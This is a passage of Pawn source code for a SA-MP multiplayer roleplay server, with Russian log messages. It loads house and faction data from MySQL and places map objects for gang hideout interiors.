      strmid(HouseInfo[i][dOwner],"None_None",0,strlen("None_None"),32);
   }
   if(mysql_num_rows() > 0)
   {
      for(new idx = 1; idx <= mysql_num_rows(); idx++)
      {
			mysql_fetch_row(query);
			sscanf(query, "p<|>iffffffs[32]iiii",
			HouseInfo[idx][dID],
			HouseInfo[idx][dEntrx],
			HouseInfo[idx][dEntry],
			HouseInfo[idx][dEntrz],
			HouseInfo[idx][dExitx],
			HouseInfo[idx][dExity],
			HouseInfo[idx][dExitz],
			HouseInfo[idx][dOwner],
			HouseInfo[idx][dPrice],
			HouseInfo[idx][dLock],
			HouseInfo[idx][dInt],
			HouseInfo[idx][dVirtual]);
			if(!strcmp(HouseInfo[idx][dOwner],"None_None",true))
			{
				HouseInfo[idx][dMIcon] = CreateDynamicMapIcon(HouseInfo[idx][dEntrx], HouseInfo[idx][dEntry], HouseInfo[idx][dEntrz], 31, 0,-1,-1,-1,200.0);
				HouseInfo[idx][dPickup] = CreateDynamicPickup(1273, 1, HouseInfo[idx][dEntrx], HouseInfo[idx][dEntry], HouseInfo[idx][dEntrz]);
			}
			else
			{
				HouseInfo[idx][dMIcon] = CreateDynamicMapIcon(HouseInfo[idx][dEntrx], HouseInfo[idx][dEntry], HouseInfo[idx][dEntrz], 32, 0,-1,-1,-1,200.0);
				HouseInfo[idx][dPickup] = CreateDynamicPickup(1272, 1, HouseInfo[idx][dEntrx], HouseInfo[idx][dEntry], HouseInfo[idx][dEntrz]);
			}
			HouseInfo[idx][dPickupExit] = Create3DTextLabel("Для выхода введите '/exit'\nУправление домом: '/dpanel'",0x33CCFFFF,HouseInfo[idx][hExitx], HouseInfo[idx][hExity], HouseInfo[idx][hExitz],20.0,HouseInfo[idx][hVirtual],1);
			TOTALDUCH++;
      }
   }
   mysql_free_result();
   printf(" [LOAD]: Успешная загрузка 'LoadDuch' - загружено %d за %d м.с", TOTALDUCH,GetTickCount() - time);
}
//==============================================================================
stock LoadHouse() // HouseInfo
{
	new time = GetTickCount();
	mysql_query("SELECT * FROM `"TABLE_HOUSE"` ORDER BY  `"TABLE_HOUSE"`.`id` ASC ");
	mysql_store_result();
	for(new i; i < TOTALHOUSE; i++)
	{
		strmid(HouseInfo[i][hOwner],"None_Nones",0,strlen("None_Nones"),32);
	}
	if(mysql_num_rows() > 0)
	{
		for(new idx = 1; idx <= mysql_num_rows(); idx++)
		{
			mysql_fetch_row(query);
			sscanf(query, "p<|>iffffffffffs[32]s[16]iiiiiii",
			HouseInfo[idx][id],
			HouseInfo[idx][hEntrx],
			HouseInfo[idx][hEntry],
			HouseInfo[idx][hEntrz],
			HouseInfo[idx][hExitx],
			HouseInfo[idx][hExity],
			HouseInfo[idx][hExitz],
			HouseInfo[idx][hCarx],
			HouseInfo[idx][hCary],
			HouseInfo[idx][hCarz],
			HouseInfo[idx][hCarfa],
			HouseInfo[idx][hOwner],
			HouseInfo[idx][hDiscript],
			HouseInfo[idx][hPrice],
			HouseInfo[idx][hBuyPrice],
			HouseInfo[idx][hInt],
			HouseInfo[idx][hVirtual],
			HouseInfo[idx][hLock],
			HouseInfo[idx][hOplata],
			HouseInfo[idx][hHeal]);
			if(!strcmp(HouseInfo[idx][hOwner],"None",true))
			{
				HouseInfo[idx][hMIcon] = CreateDynamicMapIcon(HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz], 31, 0,-1,-1,-1,200.0);
				HouseInfo[idx][hPickup] = CreatePickup(1273, 1, HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz]);
			}
			else
			{
				HouseInfo[idx][hMIcon] = CreateDynamicMapIcon(HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz], 32, 0,-1,-1,-1,200.0);
				HouseInfo[idx][hPickup] = CreatePickup(1272, 1, HouseInfo[idx][hEntrx], HouseInfo[idx][hEntry], HouseInfo[idx][hEntrz]);
			}
			HouseInfo[idx][hPickupExit] = Create3DTextLabel("Для выхода введите '/exit'\nУправление домом: '/hpanel'",0x33CCFFFF,HouseInfo[idx][hExitx], HouseInfo[idx][hExity], HouseInfo[idx][hExitz],20.0,HouseInfo[idx][hVirtual],1);
			TOTALHOUSE++;
		}
	}
	mysql_free_result();
	print("\n----------------------------------");
	printf(" [LOAD]: Успешная загрузка 'LoadHouses' - загружено %d за %d м.с", TOTALHOUSE,GetTickCount() - time);
}
//==============================================================================
stock LoadFrac()
{
	new time = GetTickCount();
	mysql_query("SELECT * FROM `"TABLE_FRACTION"`");
	mysql_store_result();
	if(mysql_num_rows() > 0)
	{
		for(new idx = 1; idx <= mysql_num_rows(); idx++)
		{
			mysql_fetch_row(query);
			sscanf(query, "p<|>is[32]s[32]s[32]s[16]s[25]s[25]s[25]s[25]s[25]s[25]s[25]s[25]s[25]s[25]s[25]s[25]s[25]s[128]",
			FracInfo[idx][id],
			FracInfo[idx][fName],
			FracInfo[idx][fLeader],
			FracInfo[idx][fAssistant],
			FracInfo[idx][fHelpers],
			FracRank[idx][1],
			FracRank[idx][2],
			FracRank[idx][3],
			FracRank[idx][4],
			FracRank[idx][5],
			FracRank[idx][6],
			FracRank[idx][7],
			FracRank[idx][8],
			FracRank[idx][9],
			FracRank[idx][10],
			FracRank[idx][11],
			FracRank[idx][12],
			FracRank[idx][13],
			FracInfo[idx][fPayDays]);
			sscanf(FracInfo[idx][fHelpers], "p<,>a<i>[5]",FracInfo[idx][fHelper]);
			sscanf(FracInfo[idx][fPayDays], "p<,>iiiiiiiiiiiii",
			FracPay[idx][1],
			FracPay[idx][2],
			FracPay[idx][3],
			FracPay[idx][4],
			FracPay[idx][5],
			FracPay[idx][6],
			FracPay[idx][7],
			FracPay[idx][8],
			FracPay[idx][9],
			FracPay[idx][10],
			FracPay[idx][11],
			FracPay[idx][12],
			FracPay[idx][13]);
			TOTALFRAC++;
		}
	}
	mysql_free_result();
	printf(" [LOAD]: Успешная загрузка 'LoadFrac' - загружено %d за %d м.с", TOTALFRAC,GetTickCount() - time);
}
//==============================================================================
stock LoadTimers()
{
	secupdate = SetTimer("SecUpdate", ONE_SECOND_UPDATE, 1);
	badengine = SetTimer("BadEngine", ONE_HUNDRED_MSECOND, 1);
	return true;
}
//==============================================================================
stock LoadObject()
{
//======================================Шахта===================================
CreateObject(971, 2539.3469238281, 2823.2858886719, 13.390000343323, 0, 0, 90); // Объект 0
CreateDynamicObject(906, -397.61898803711, 1245.2349853516, 7.6329998970032, 0, 0, 0); // объект 0
CreateDynamicObject(19380, -462.25900268555, 1446.0999755859, 19.799999237061, 0, 90, 13.999938964844); // объект 1
CreateDynamicObject(1638, -465.95999145508, 1447.7449951172, 21.566999435425, 0, 0, 14); // объект 2
CreateDynamicObject(983, -466.97100830078, 1443.3020019531, 20.569000244141, 0, 0, 14); // объект 3
CreateDynamicObject(983, -467.74499511719, 1446.4010009766, 20.569000244141, 0, 0, 13.99658203125); // объект 4
CreateDynamicObject(983, -465.41598510742, 1450.2540283203, 20.569000244141, 0, 0, 284); // объект 5
CreateDynamicObject(983, -463.10900878906, 1440.9759521484, 20.569000244141, 0, 0, 283.99658203125); // объект 6
CreateDynamicObject(983, -460.00601196289, 1441.751953125, 20.569000244141, 0, 0, 283.99658203125); // объект 7
CreateDynamicObject(1391, -460.37701416016, 1446.5059814453, 7.6999998092651, 0, 340, 18); // объект 8
CreateDynamicObject(2669, -450.0530, 1441.6700, 21.3700, 0, 0, 198); // объект 0
CreateDynamicObject(816, -449.3529, 1439.6400, 20.3990, 0, 0, 44); // объект 1
	///////////////////////////////////// GANG OKNA RESPU
	CreateDynamicObject(14526,2804.2255859,-1618.4833984,15.4519997,0.0000000,0.0000000,166.9921875); //object(sweetsmain) (1)
	CreateDynamicObject(3029,2806.6159668,-1617.8079834,13.5990000,0.0000000,0.0000000,76.2500000); //object(cr1_door) (3)
	CreateDynamicObject(2297,2799.0029297,-1617.1090088,13.5990000,0.0000000,0.0000000,303.2500000); //object(tv_unit_2) (1)
	CreateDynamicObject(1709,2802.2160645,-1621.6579590,13.5990000,0.0000000,0.0000000,168.5000000); //object(kb_couch08) (1)
	CreateDynamicObject(1712,2797.2709961,-1618.5229492,13.5990000,0.0000000,0.0000000,76.2500000); //object(kb_couch05) (1)
	CreateDynamicObject(1417,2803.1809082,-1617.2519531,13.5990000,0.0000000,0.0000000,344.2500000); //object(dyn_cupboard) (1)
	CreateDynamicObject(2116,2804.0449219,-1623.1972656,13.5990000,0.0000000,0.0000000,347.2448730); //object(low_dinning_6) (1)
	CreateDynamicObject(356,2804.4838867,-1623.0760498,14.3929996,83.7930298,310.0131226,352.3208008); //object(1)
	CreateDynamicObject(357,2802.1569824,-1623.3580322,15.8789997,0.0000000,0.0000000,353.0000000); //object(2)
	CreateDynamicObject(363,2803.8720703,-1623.4849854,14.6929998,0.0000000,0.0000000,160.0000000); //object(3)
	CreateDynamicObject(364,2803.7990723,-1623.2480469,14.3680000,0.0000000,0.0000000,0.0000000); //object(4)
	CreateDynamicObject(336,2805.4389648,-1622.9460449,13.7989998,0.0000000,0.0000000,0.0000000); //object(5)
	CreateDynamicObject(348,2804.7629395,-1623.1870117,14.4180002,80.4999390,180.0000000,180.0000000); //object(6)
	CreateDynamicObject(353,2804.9460449,-1623.3549805,14.3929996,80.9429321,245.7198181,114.5507812); //object(7)
	CreateDynamicObject(14471,2172.2958984,-1782.0361328,14.3100004,0.0000000,0.0000000,179.9945068); //object(carls_moms_kit2) (2)
	CreateDynamicObject(19372,2177.2871094,-1779.8280029,12.4010000,0.0000000,0.0000000,0.0000000); //object(wall020) (1)
	CreateDynamicObject(19372,2177.2800293,-1782.9019775,12.4010000,0.0000000,0.0000000,0.0000000); //object(wall020) (2)
	CreateDynamicObject(19372,2177.2758789,-1784.1510010,12.4010000,0.0000000,0.0000000,0.0000000); //object(wall020) (3)
	CreateDynamicObject(19372,2175.1101074,-1785.8459473,11.9759998,0.0000000,0.0000000,89.7500000); //object(wall020) (4)
	CreateDynamicObject(19372,2175.7319336,-1785.8520508,11.9759998,0.0000000,0.0000000,90.0000000); //object(wall020) (5)
	CreateDynamicObject(19372,2175.8889160,-1778.2290039,11.9759998,0.0000000,0.0000000,90.2500000); //object(wall020) (6)
	CreateDynamicObject(19372,2176.1179199,-1779.5649414,12.4510002,0.0000000,270.5000000,90.2471924); //object(wall020) (8)
	CreateDynamicObject(19372,2176.2724609,-1782.5595703,12.4510002,0.0000000,270.4998779,90.2471924); //object(wall020) (9)
	CreateDynamicObject(19372,2175.6721191,-1784.0279541,12.4510002,0.0000000,270.5000000,90.2471924); //object(wall020) (10)
	CreateDynamicObject(19372,2174.7080078,-1783.9990234,12.4510002,0.0000000,270.4943848,90.2471924); //object(wall020) (11)
	CreateDynamicObject(2025,2169.4040527,-1781.7170410,12.5760002,0.0000000,0.0000000,90.0000000); //object(mrk_wrobe_tmp) (2)
	CreateDynamicObject(2025,2169.4079590,-1781.0019531,12.5760002,0.0000000,0.0000000,90.0000000); //object(mrk_wrobe_tmp) (3)
	CreateDynamicObject(19372,2167.5590820,-1782.0689697,14.2259998,0.0000000,0.0000000,90.2471924); //object(wall020) (12)
	CreateDynamicObject(19372,2169.7250977,-1778.0739746,14.2760000,0.0000000,0.0000000,0.0000000); //object(wall020) (13)
	CreateDynamicObject(19372,2169.7241211,-1780.4439697,16.6509991,0.0000000,0.0000000,0.0000000); //object(wall020) (14)
	CreateDynamicObject(19372,2168.1289062,-1782.0469971,14.2259998,0.0000000,0.0000000,89.9971924); //object(wall020) (15)
	CreateDynamicObject(19372,2168.1289062,-1782.0469971,14.6510000,0.0000000,0.0000000,89.9945068); //object(wall020) (16)
	CreateDynamicObject(19372,2171.6459961,-1778.1590576,13.9010000,0.0000000,0.0000000,90.2471924); //object(wall020) (17)
	CreateDynamicObject(1769,2170.4770508,-1779.5379639,12.5760002,0.0000000,0.0000000,42.0000000); //object(low_single_3) (1)
	CreateDynamicObject(2208,2176.7548828,-1778.7800293,12.5760002,0.0000000,0.0000000,180.7500000); //object(med_office7_unit_1) (2)
	CreateDynamicObject(1768,2170.4189453,-1785.2709961,12.5760002,0.0000000,0.0000000,179.2500000); //object(low_couch_3) (1)
	CreateDynamicObject(1768,2173.1440430,-1785.3070068,12.5760002,0.0000000,0.0000000,178.2474365); //object(low_couch_3) (2)
	CreateDynamicObject(2208,2176.7548828,-1778.7792969,12.5760002,0.0000000,0.0000000,270.7470703); //object(med_office7_unit_1) (3)
	CreateDynamicObject(2208,2176.7871094,-1781.4479980,12.5760002,0.0000000,0.0000000,270.7470703); //object(med_office7_unit_1) (4)
	CreateDynamicObject(2208,2176.8168945,-1782.8149414,12.5760002,0.0000000,0.0000000,270.2470703); //object(med_office7_unit_1) (5)
	CreateDynamicObject(1768,2175.9450684,-1785.3699951,12.5760002,0.0000000,0.0000000,178.2421875); //object(low_couch_3) (3)
	CreateDynamicObject(1769,2172.4699707,-1778.7390137,12.5760002,0.0000000,0.0000000,337.9952393); //object(low_single_3) (2)
	CreateDynamicObject(336,2170.4980469,-1779.9279785,12.8260002,0.0000000,0.0000000,89.7500000); //object(9)
	CreateDynamicObject(351,2176.2810059,-1779.1159668,13.4659996,88.9692078,255.9456482,104.0565186); //object(10)
	CreateDynamicObject(355,2176.6479492,-1781.2189941,13.4910002,274.2573242,86.6376953,18.6283569); //object(11)
	CreateDynamicObject(359,2175.4550781,-1785.7440186,15.3649998,0.0000000,0.0000000,0.0000000); //object(12)
	CreateDynamicObject(365,2176.8820801,-1780.3060303,13.5909996,0.0000000,0.0000000,0.0000000); //object(13)
	CreateDynamicObject(343,2175.6059570,-1779.1979980,13.5159998,0.0000000,0.0000000,0.0000000); //object(15)
	CreateDynamicObject(357,2176.7819824,-1783.0520020,13.4910002,277.2543640,88.0324402,8.2665710); //object(16)
	CreateDynamicObject(371,2174.4870605,-1778.6870117,13.6409998,0.0000000,0.0000000,0.0000000); //object(17)
	CreateDynamicObject(19378,2485.7580566,-1639.2740479,13.2309999,0.0000000,90.0000000,1.5000000); //object(wall026) (1)
	CreateDynamicObject(19404,2488.8010254,-1644.0959473,15.0139999,0.0000000,0.0000000,91.0000000); //object(wall052) (1)
	CreateDynamicObject(19358,2484.1499023,-1644.1789551,15.0530005,0.0000000,0.0000000,95.7500000); //object(wall006) (2)
	CreateDynamicObject(19358,2481.9628906,-1644.2540283,15.0530005,0.0000000,0.0000000,90.4968262); //object(wall006) (3)
	CreateDynamicObject(19358,2490.2648926,-1639.5050049,15.0030003,0.0000000,0.0000000,0.0000000); //object(wall006) (4)
	CreateDynamicObject(19358,2490.2639160,-1636.3110352,15.0030003,0.0000000,0.0000000,0.0000000); //object(wall006) (5)
	CreateDynamicObject(19358,2480.6589355,-1639.6579590,15.0530005,0.0000000,0.0000000,0.0000000); //object(wall006) (7)
	CreateDynamicObject(19358,2480.6621094,-1636.5849609,15.0530005,0.0000000,0.0000000,0.0000000); //object(wall006) (8)
	CreateDynamicObject(19404,2490.2539062,-1642.4229736,15.0139999,0.0000000,0.0000000,179.7497559); //object(wall052) (2)
	CreateDynamicObject(19404,2480.6120605,-1642.8409424,15.0640001,0.0000000,0.0000000,179.2497559); //object(wall052) (3)
	CreateDynamicObject(19358,2482.1179199,-1634.9210205,15.0530005,0.0000000,0.0000000,91.7468262); //object(wall006) (9)
	CreateDynamicObject(19358,2485.3110352,-1634.8260498,15.0530005,0.0000000,0.0000000,91.7468262); //object(wall006) (10)
	CreateDynamicObject(19358,2487.9809570,-1634.7419434,15.0530005,0.0000000,0.0000000,91.7468262); //object(wall006) (11)
	CreateDynamicObject(19358,2488.6579590,-1634.7189941,15.0530005,0.0000000,0.0000000,91.7468262); //object(wall006) (12)
	CreateDynamicObject(19378,2485.7580566,-1639.2729492,16.7560005,0.0000000,90.0000000,1.4996338); //object(wall026) (2)
	CreateDynamicObject(19435,2486.1530762,-1644.1409912,16.4419994,90.0000000,179.4083862,91.0916138); //object(wall075) (1)
	CreateDynamicObject(1736,2486.4570312,-1643.7550049,16.2119999,0.0000000,0.0000000,181.0000000); //object(cj_stags_head) (1)
	CreateDynamicObject(2296,2481.3669434,-1635.2480469,13.3170004,0.0000000,0.0000000,0.0000000); //object(tv_unit_1) (1)
	CreateDynamicObject(2718,2487.6999512,-1634.8370361,16.0119991,0.0000000,0.0000000,0.7500000); //object(cj_fly_killer) (1)
	CreateDynamicObject(2280,2485.0290527,-1635.4210205,15.4670000,0.0000000,0.0000000,1.7500000); //object(frame_thick_1) (1)
	CreateDynamicObject(1713,2483.2971191,-1639.2929688,13.3170004,0.0000000,0.0000000,180.2500000); //object(kb_couch04) (1)
	CreateDynamicObject(1708,2484.8989258,-1638.3199463,13.3170004,0.0000000,0.0000000,222.0000000); //object(kb_chair02) (1)
	CreateDynamicObject(2311,2488.2141113,-1635.3590088,13.3170004,0.0000000,0.0000000,2.2500000); //object(cj_tv_table2) (1)
	CreateDynamicObject(2311,2485.7380371,-1635.4489746,13.3170004,0.0000000,0.0000000,2.2467041); //object(cj_tv_table2) (2)
	CreateDynamicObject(2835,2485.9890137,-1643.8330078,13.3170004,0.0000000,0.0000000,0.0000000); //object(gb_livingrug04) (1)
	CreateDynamicObject(2854,2485.7819824,-1635.7440186,13.8219995,0.0000000,0.0000000,0.0000000); //object(gb_bedmags04) (1)
	CreateDynamicObject(2096,2481.4670410,-1643.4919434,13.3170004,0.0000000,0.0000000,120.0000000); //object(cj_rockingchair) (1)
	CreateDynamicObject(18659,2490.1569824,-1639.2039795,15.5730000,0.0000000,0.0000000,0.2500000); //object(spraytag1) (1)
	CreateDynamicObject(18665,2809.8898926,-1618.6409912,15.5170002,0.0000000,0.0000000,77.5000000); //object(spraytag7) (1)
	CreateDynamicObject(1575,2486.5400391,-1635.4029541,13.8000002,0.0000000,0.0000000,0.0000000); //object(drug_white) (1)
	CreateDynamicObject(1575,2487.0830078,-1635.1090088,13.8000002,0.0000000,0.0000000,0.0000000); //object(drug_white) (2)
	CreateDynamicObject(1575,2487.0869141,-1635.5379639,13.8000002,0.0000000,0.0000000,0.0000000); //object(drug_white) (3)
	CreateDynamicObject(1575,2486.7990723,-1635.1269531,13.9499998,0.0000000,0.0000000,0.0000000); //object(drug_white) (5)
	CreateDynamicObject(1575,2486.5520020,-1635.0620117,13.8000002,0.0000000,0.0000000,0.0000000); //object(drug_white) (6)
	CreateDynamicObject(1636,2487.9899902,-1635.2080078,13.9350004,0.0000000,0.0000000,0.0000000); //object(rcbomb) (1)
	CreateDynamicObject(1654,2489.8320312,-1635.4639893,14.0150003,0.0000000,0.0000000,0.0000000); //object(dynamite) (1)
	CreateDynamicObject(2057,2489.7399902,-1643.6600342,13.4870005,0.0000000,0.0000000,0.0000000); //object(flame_tins) (1)
	CreateDynamicObject(2060,2482.4389648,-1643.9749756,13.4740000,0.0000000,0.0000000,0.0000000); //object(cj_sandbag) (1)
	CreateDynamicObject(1252,2489.1269531,-1635.5670166,13.9119997,270.0000000,180.0001221,176.0001221); //object(barrelexpos) (1)
	CreateDynamicObject(1279,2486.8369141,-1635.4449463,13.4239998,0.0000000,0.0000000,0.0000000); //object(craigpackage) (1)
	CreateDynamicObject(349,2488.5859375,-1635.4620361,13.8970003,283.9408875,47.6122437,71.0083313); //object(18)
	CreateDynamicObject(360,2483.4040527,-1644.1090088,15.9320002,0.0000000,0.0000000,2.0000000); //object(20)
	CreateDynamicObject(924,2481.3750000,-1640.1590576,13.4980001,0.0000000,0.0000000,0.0000000); //object(fruitcrate3) (1)
	CreateDynamicObject(3092,2487.8811035,-1644.4429932,15.2010002,0.0000000,0.0000000,179.7500000); //object(dead_tied_cop) (1)
	CreateDynamicObject(19173,2487.5319824,-1634.8580322,15.1669998,0.0000000,0.0000000,1.2500000); //object(samppicture2) (1)
	CreateDynamicObject(19174,2480.7548828,-1639.3360596,15.6920004,0.0000000,0.0000000,90.0000000); //object(samppicture3) (1)
	CreateDynamicObject(3061,2166.1850586,-1786.0560303,13.7089996,0.0000000,0.0000000,90.0000000); //object(ad_flatdoor) (1)
	CreateDynamicObject(19355,1692.3060303,-2095.8449707,14.4469995,0.0000000,0.0000000,359.0000000); //object(wall003) (1)
	CreateDynamicObject(19379,1687.1770020,-2092.6960449,12.8479996,0.0000000,90.0000000,0.0000000); //object(wall027) (1)
	CreateDynamicObject(19401,1688.2459717,-2097.3811035,14.3339996,0.0000000,0.0000000,90.0000000); //object(wall049) (1)
	CreateDynamicObject(19355,1691.0999756,-2096.5681152,14.2720003,0.0000000,0.0000000,303.7471924); //object(wall003) (2)
	CreateDynamicObject(19355,1685.6910400,-2097.3659668,14.6470003,0.0000000,0.0000000,270.2434082); //object(wall003) (3)
	CreateDynamicObject(19379,1685.2580566,-2092.8059082,12.8230000,0.0000000,90.0000000,0.0000000); //object(wall027) (2)
	CreateDynamicObject(19355,1692.3299561,-2092.8229980,14.4720001,0.0000000,0.0000000,0.2471924); //object(wall003) (4)
	CreateDynamicObject(19355,1692.3520508,-2089.8181152,14.4469995,0.0000000,0.0000000,0.2471924); //object(wall003) (5)
	CreateDynamicObject(19355,1690.7729492,-2088.3278809,14.4469995,0.0000000,0.0000000,270.2416992); //object(wall003) (6)
	CreateDynamicObject(19355,1687.6440430,-2088.3291016,14.3970003,0.0000000,0.0000000,270.2416992); //object(wall003) (7)
	CreateDynamicObject(19355,1684.6800537,-2088.3310547,14.6470003,0.0000000,0.0000000,270.2416992); //object(wall003) (8)
	CreateDynamicObject(19355,1681.4919434,-2088.3459473,14.6470003,0.0000000,0.0000000,270.2416992); //object(wall003) (9)
	CreateDynamicObject(19401,1680.0660400,-2089.9360352,14.3339996,0.0000000,0.0000000,180.2500000); //object(wall049) (2)
	CreateDynamicObject(19355,1680.0720215,-2092.9020996,14.4469995,0.0000000,0.0000000,0.2471924); //object(wall003) (10)
	CreateDynamicObject(19355,1680.0739746,-2095.8349609,14.4469995,0.0000000,0.0000000,0.2471924); //object(wall003) (11)
	CreateDynamicObject(19355,1682.7249756,-2097.3959961,14.6470003,0.0000000,0.0000000,270.2416992); //object(wall003) (12)
	CreateDynamicObject(19355,1681.7290039,-2097.3081055,14.6470003,0.0000000,0.0000000,270.2416992); //object(wall003) (13)
	CreateDynamicObject(19355,1683.5319824,-2095.8669434,14.4469995,0.0000000,0.0000000,0.2471924); //object(wall003) (14)
	CreateDynamicObject(19355,1686.5830078,-2095.9760742,14.4469995,0.0000000,0.0000000,0.2471924); //object(wall003) (15)
	CreateDynamicObject(19355,1685.0629883,-2094.3649902,14.6470003,0.0000000,0.0000000,270.2416992); //object(wall003) (16)
	CreateDynamicObject(19379,1687.1770020,-2092.6950684,16.0979996,0.0000000,90.0000000,0.0000000); //object(wall027) (3)
	CreateDynamicObject(19379,1685.2580566,-2092.8059082,16.0730000,0.0000000,90.0000000,0.0000000); //object(wall027) (4)
	CreateDynamicObject(3029,1683.5169678,-2097.2749023,12.9709997,0.0000000,0.0000000,0.0000000); //object(cr1_door) (1)
	CreateDynamicObject(1756,1691.4010010,-2095.6870117,12.9340000,0.0000000,0.0000000,212.0000000); //object(low_couch_4) (1)
	CreateDynamicObject(1762,1691.7609863,-2093.5939941,12.9340000,0.0000000,0.0000000,270.0000000); //object(swank_single_2) (1)
	CreateDynamicObject(2063,1689.0760498,-2088.7028809,13.8430004,0.0000000,0.0000000,0.0000000); //object(cj_greenshelves) (1)
	CreateDynamicObject(2331,1687.0080566,-2094.6411133,13.1780005,0.0000000,0.0000000,0.0000000); //object(cj_bed_furn_1) (1)
	CreateDynamicObject(2320,1687.1070557,-2094.6721191,13.8330002,0.0000000,0.0000000,50.0000000); //object(cj_tele_5) (1)
	CreateDynamicObject(2115,1680.6979980,-2088.9160156,12.9090004,0.0000000,0.0000000,359.2500000); //object(low_dinning_1) (1)
	CreateDynamicObject(18635,1691.7030029,-2093.3701172,12.8719997,8.4979553,1.2638855,1.0632019); //object(gtasahammer1) (1)
	CreateDynamicObject(18641,1682.0980225,-2089.2160645,13.7469997,87.2498474,180.0000000,179.9999390); //object(flashlight1) (1)
	CreateDynamicObject(18885,1680.5699463,-2096.0839844,14.0330000,0.0000000,0.0000000,92.0000000); //object(gunvendingmachine1) (1)
	CreateDynamicObject(1279,1688.7669678,-2088.7548828,13.3730001,0.0000000,0.0000000,0.0000000); //object(craigpackage) (2)
	CreateDynamicObject(2057,1680.6390381,-2088.6250000,13.0790005,0.0000000,0.0000000,0.0000000); //object(flame_tins) (2)
	CreateDynamicObject(1210,1680.9990234,-2088.4340820,13.8590002,0.0000000,0.0000000,0.0000000); //object(briefcase) (1)
	CreateDynamicObject(1575,1680.5489502,-2096.2639160,15.1129999,0.0000000,0.0000000,326.0000000); //object(drug_white) (4)
	CreateDynamicObject(1575,1691.9329834,-2088.6999512,12.9110003,0.0000000,0.0000000,325.9973145); //object(drug_white) (7)
	CreateDynamicObject(1575,1691.6579590,-2089.0061035,12.9110003,0.0000000,0.0000000,339.9973145); //object(drug_white) (8)
	CreateDynamicObject(1575,1691.2290039,-2088.6101074,12.9110003,0.0000000,0.0000000,355.9938965); //object(drug_white) (9)
	CreateDynamicObject(1575,1691.7609863,-2088.8000488,13.0609999,0.0000000,0.0000000,29.9938965); //object(drug_white) (10)
	CreateDynamicObject(1636,1689.8029785,-2088.7739258,14.7629995,0.0000000,0.0000000,82.0000000); //object(rcbomb) (2)
	CreateDynamicObject(1650,1688.5720215,-2088.7089844,14.9379997,0.0000000,0.0000000,0.0000000); //object(petrolcanm) (1)
	CreateDynamicObject(1654,1680.6810303,-2088.8740234,13.9029999,0.0000000,0.0000000,0.0000000); //object(dynamite) (2)
	CreateDynamicObject(341,1691.8659668,-2089.9389648,13.1840000,359.1613464,33.0039673,70.5446777); //object(8)
	CreateDynamicObject(344,1689.0009766,-2088.7971191,14.8269997,0.0000000,0.0000000,0.0000000); //object(14)
	CreateDynamicObject(344,1689.2650146,-2088.7629395,14.8269997,0.0000000,0.0000000,0.0000000); //object(19)
	CreateDynamicObject(344,1689.2159424,-2088.6101074,14.8269997,0.0000000,0.0000000,0.0000000); //object(21)
	CreateDynamicObject(344,1689.0699463,-2088.6020508,14.8269997,0.0000000,0.0000000,0.0000000); //object(22)
	CreateDynamicObject(349,1682.2290039,-2088.4719238,14.7130003,0.0000000,0.0000000,7.2500000); //object(23)
	CreateDynamicObject(353,1681.3859863,-2088.8759766,13.7110004,84.9699097,243.4877930,196.6005402); //object(24)
	CreateDynamicObject(363,1687.3559570,-2088.5400391,13.1840000,0.0000000,0.0000000,0.0000000); //object(25)
	CreateDynamicObject(363,1687.1280518,-2088.5720215,13.1840000,0.0000000,0.0000000,0.0000000); //object(26)
	CreateDynamicObject(363,1687.3349609,-2088.8139648,13.1840000,0.0000000,0.0000000,34.0000000); //object(27)
	CreateDynamicObject(364,1688.0770264,-2088.7849121,13.7670002,0.0000000,0.0000000,0.0000000); //object(28)
	CreateDynamicObject(2816,1688.7929688,-2096.7700195,12.9340000,0.0000000,0.0000000,0.0000000); //object(gb_bedmags01) (1)
	CreateDynamicObject(2818,1689.0290527,-2095.1569824,12.9340000,0.0000000,0.0000000,0.0000000); //object(gb_bedrug02) (1)
	CreateDynamicObject(2256,1684.4699707,-2088.4340820,15.0570002,0.0000000,0.0000000,0.0000000); //object(frame_clip_3) (1)
	CreateDynamicObject(2266,1691.7459717,-2092.8911133,15.0839996,0.0000000,0.0000000,270.0000000); //object(frame_wood_5) (1)
	CreateDynamicObject(19466,1688.3289795,-2097.3110352,14.7480001,0.0000000,0.0000000,269.5000000); //object(window001) (1)
	CreateDynamicObject(19466,1680.1500244,-2089.9570312,14.3769999,0.0000000,0.0000000,180.2446289); //object(window001) (2)
	CreateDynamicObject(19378,2485.7939453,-1990.0760498,12.8090000,0.0000000,90.0000000,0.2499084); //object(wall026) (3)
	CreateDynamicObject(19378,2483.1760254,-1990.0529785,12.7840004,0.0000000,90.0000000,0.2471619); //object(wall026) (4)
	CreateDynamicObject(19461,2490.7419434,-1989.9899902,14.4449997,0.0000000,0.0000000,0.0000000); //object(wall101) (1)
	CreateDynamicObject(19461,2486.1621094,-1985.3120117,14.4200001,0.0000000,0.0000000,89.5000000); //object(wall101) (2)
	CreateDynamicObject(19415,2486.8300781,-1994.7540283,14.3950005,0.0000000,0.0000000,92.0000000); //object(wall063) (1)
	CreateDynamicObject(19369,2489.5009766,-1993.7309570,14.4449997,0.0000000,0.0000000,308.0000000); //object(wall017) (1)
	CreateDynamicObject(19369,2481.5190430,-1993.0439453,14.6450005,0.0000000,0.0000000,358.7421875); //object(wall017) (3)
	CreateDynamicObject(19369,2483.0690918,-1991.4090576,14.6450005,0.0000000,0.0000000,90.2421875); //object(wall017) (4)
	CreateDynamicObject(19369,2479.8349609,-1994.2359619,14.6450005,0.0000000,0.0000000,90.2416992); //object(wall017) (5)
	CreateDynamicObject(19415,2478.2109375,-1993.0520020,14.5699997,0.0000000,0.0000000,2.9995117); //object(wall063) (2)
	CreateDynamicObject(19369,2478.0280762,-1989.8979492,14.4949999,0.0000000,0.0000000,183.2416992); //object(wall017) (6)
	CreateDynamicObject(19369,2477.9340820,-1986.8929443,14.4700003,0.0000000,0.0000000,180.4909668); //object(wall017) (7)
	CreateDynamicObject(19369,2479.8740234,-1985.2760010,14.6450005,0.0000000,0.0000000,90.2416992); //object(wall017) (8)
	CreateDynamicObject(19442,2478.4570312,-1985.6140137,14.4700003,0.0000000,0.0000000,310.0000000); //object(wall082) (1)
	CreateDynamicObject(19442,2484.9140625,-1994.1500244,14.6450005,0.0000000,0.0000000,30.0000000); //object(wall082) (2)
	CreateDynamicObject(19378,2485.7939453,-1990.0749512,15.9589996,0.0000000,90.0000000,0.2471924); //object(wall026) (5)
